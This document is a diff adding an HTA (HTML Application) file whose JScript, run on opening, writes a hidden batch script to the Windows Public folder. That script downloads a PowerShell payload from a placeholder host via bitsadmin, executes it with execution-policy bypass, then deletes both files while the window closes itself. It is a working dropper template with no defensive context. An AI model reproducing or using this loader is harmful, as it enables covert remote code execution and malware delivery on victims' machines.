@@ -1,0 +1,24 @@
+<html>
+<head>
+<HTA:APPLICATION ID="MyExample">
+<script language="jscript">
+        var c = '';
+        var oShell = new ActiveXObject('WScript.Shell');
+
+        var fso = new ActiveXObject("Scripting.FileSystemObject");
+        var s = fso.CreateTextFile("C:/Users/Public/file.txt", true);
+
+        s.WriteLine("@echo off");
+        s.WriteLine("bitsadmin /transfer mydownloadjob  /download  /priority normal http://x.x.x.x/e.ps1 C:\\Users\\Public\\e.ps1");
+        s.WriteLine("powershell -exec bypass C:\\Users\\Public\\e.ps1");
+        s.WriteLine("del C:\\Users\\Public\\e.ps1");
+        s.WriteLine("del C:\\Users\\Public\\file.txt");
+
+        c = 'cmd.exe /c start /min "" cmd /c "type C:\\Users\\Public\\file.txt | cmd';
+        oShell.Run(c);
+</script>
+</head>
+<body>
+<script>self.close();</script>
+</body>
+</html>
